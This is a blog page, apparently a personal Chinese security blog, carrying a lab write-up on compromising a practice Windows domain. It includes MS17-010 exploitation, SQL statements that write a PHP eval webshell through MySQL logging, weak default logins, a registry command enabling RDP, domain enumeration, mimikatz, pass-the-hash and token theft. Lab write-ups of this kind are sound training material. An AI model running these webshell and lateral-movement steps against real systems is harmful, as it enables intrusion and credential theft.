@@ -1,0 +1,275 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>靶场练习 | Yyx</title>
+<meta name="description" content="记得在这杂乱的生活里，带点微笑">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1630289601669">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://www.yyxyy.xyz/">
+        <img class="avatar" src="https://www.yyxyy.xyz//images/avatar.png?v=1630289601669" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://www.yyxyy.xyz/">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">靶场练习</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-08-30</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://www.yyxyy.xyz/tag/nb2xr1y0w/">
+                    靶场
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://www.yyxyy.xyz/tag/nGJLimJ-tk/">
+                    内网渗透
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <h1 id="0x01-环境准备">0x01 环境准备</h1>
+<p>1.kali 外网服务器（攻击机） win10 外网攻击机</p>
+<p>2.win7(双网卡)  外网服务器  仅主机模式和nat模式</p>
+<p>3.win2003(内网)  nat模式  拟内网域成员主机</p>
+<p>4.win2008(内网)  nat模式 内网域控主机</p>
+<p>win7打开phpstudy</p>
+<h1 id="0x02-信息收集">0x02 信息收集</h1>
+<p>nmap收集：</p>
+<pre><code class="language-shell">PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
+|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: GOD)
+1025/tcp open  msrpc        Microsoft Windows RPC
+1026/tcp open  msrpc        Microsoft Windows RPC
+1027/tcp open  msrpc        Microsoft Windows RPC
+1028/tcp open  msrpc        Microsoft Windows RPC
+1029/tcp open  msrpc        Microsoft Windows RPC
+3306/tcp open  mysql        MySQL (unauthorized)
+MAC Address: 00:0C:29:D6:F7:87 (VMware)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -5s, deviation: 0s, median: -5s
+|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:d6:f7:87 (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-29T03:31:32
+|_  start_date: 2021-08-29T02:47:18
+</code></pre>
+<p>发现80端口是个php探针</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/1.png" alt="1630208790337" loading="lazy"></figure>
+<p>对其目录进行扫描，发现phpmyadmin。这里就可以考虑phpmyadmin的弱口令，进后台拿shell。<img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/2.png" alt="1630209693686" loading="lazy"></p>
+<h1 id="0x03-漏洞攻击">0x03 漏洞攻击</h1>
+<p>第一条线</p>
+<p>其实看见445端口开放，以及win7这个信息就想到了ms17010，（中间打蓝屏了几次哈哈哈）</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/3.png" alt="1630209528653" loading="lazy"></figure>
+<p>设置payload</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/4.png" alt="1630209775879" loading="lazy"></figure>
+<p>成了。</p>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/5.png" alt="1630209795143" loading="lazy"></figure>
+<p>第二条线</p>
+<p>使用root/root弱口令进入后台。</p>
+<p>找到执行sql语句的点</p>
+<pre><code class="language-sql">set global general_log='on'   //开启日志
+set global general_log_file =&quot;C:/phpStudy/WWW/conf.php&quot;   //写马，php探针时已经获取绝对路径
+select &quot;&lt;?php eval($_POST['x'])?&gt;&quot;  //插入一句话
+
+</code></pre>
+<p>蚁剑连接</p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/6.png" alt="1630210442285" loading="lazy"></figure>
+<p>第三条线</p>
+<p>yxcms后台使用admin/123456登录，在前台模板哪里可以直接修改php</p>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/7.png" alt="1630210795514" loading="lazy"></figure>
+<p>http://192.168.227.129/yxcms/protected/apps/default/view/default/目录下有修改的php</p>
+<p>使用哥斯拉连接</p>
+<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/8.png" alt="1630211663773" loading="lazy"></figure>
+<h1 id="0x04-内网信息收集">0x04 内网信息收集</h1>
+<p>首先用已经拿到的webshell上线cs</p>
+<p>使用ipconfig /all判断当前服务器所处的位置。这里看见这台服务器是双网卡，且存在域。</p>
+<p>也可以使用systeminfo 命令收集主机信息。查看安装的补丁，根据补丁可以判断使用哪些漏洞进行提权</p>
+<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/9.png" alt="1630245480556" loading="lazy"></figure>
+<p>可以使用tasklist，来查看是否安装的有杀软。</p>
+<p>这里使用CS提权</p>
+<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/10.png" alt="1630244253114" loading="lazy"></figure>
+<p>一些信息收集的命令</p>
+<pre><code class="language-shell">ipconfig /all 查询一下本机的一些情况,IP段 网关 属于不属于域
+net view 查询一些存在联系的机器,一般以机器名显示,我们需要对其PING出IP,一是方便查询哪些重要机器的IP,二是方便查询存在几个段
+net view /domain 查询有几个域 因为大型网络里面一般不止一个域的
+net group /domain 查询域里面的组
+net user /domain 查询域用户
+net group “domain admins” /domain 查询域管理用户组
+</code></pre>
+<p>使用猕猴桃抓取密码，这里抓到了明文。</p>
+<p>在命令行开启3389端口（真实环境不建议开3389，除非本身开着的，高危行为）</p>
+<pre><code class="language-powershell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>使用获取的账号密码进行远程连接</p>
+<figure data-type="image" tabindex="10"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/11.png" alt="1630246747875" loading="lazy"></figure>
+<p>探测内网存活主机。</p>
+<pre><code class="language-powershell">for /l %i in (1,1,255) do @ping 192.168.64.%i -w 1 -n 1|find /i &quot;ttl=&quot;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/12.png" alt="1630247142123" loading="lazy"></figure>
+<h1 id="0x05-横向渗透">0x05 横向渗透</h1>
+<p>这里利用psexec，因为192.168.52.0/24段不能直接连接。</p>
+<p>首先新建一个smb监听，然后利用cs的spwn派生会话，选择smb监听。</p>
+<p>然后进行hash传递攻击</p>
+<p>在视图--&gt;目标--&gt;选中前面扫描的所有目标--&gt;右键jump--&gt;psexec--&gt;选取凭证和监听器以及会话--&gt;运行</p>
+<figure data-type="image" tabindex="12"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/13.png" alt="1630249581022" loading="lazy"></figure>
+<p>token窃取</p>
+<p>除了前面使用获取的hash，也可以直接窃取token来登录其它服务器</p>
+<p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p>
+<p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p>
+<figure data-type="image" tabindex="13"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/14.png" alt="1630250074750" loading="lazy"></figure>
+<p>然后勾选使用当前会话令牌</p>
+<figure data-type="image" tabindex="14"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/15.png" alt="1630250193248" loading="lazy"></figure>
+<p>效果差不多。</p>
+<p>也可以联动msf使用一些常见的漏洞进行扫描，批量打。比如ms_17010</p>
+<p>暂时先这样。</p>
+<p>参考连接：</p>
+<p>https://soapffz.com/sec/558.html</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://www.yyxyy.xyz/post/word-hong-mian-sha/">
+              <h3 class="post-title">
+                下一篇：word宏免杀
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">记得在这杂乱的生活里，带点微笑</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
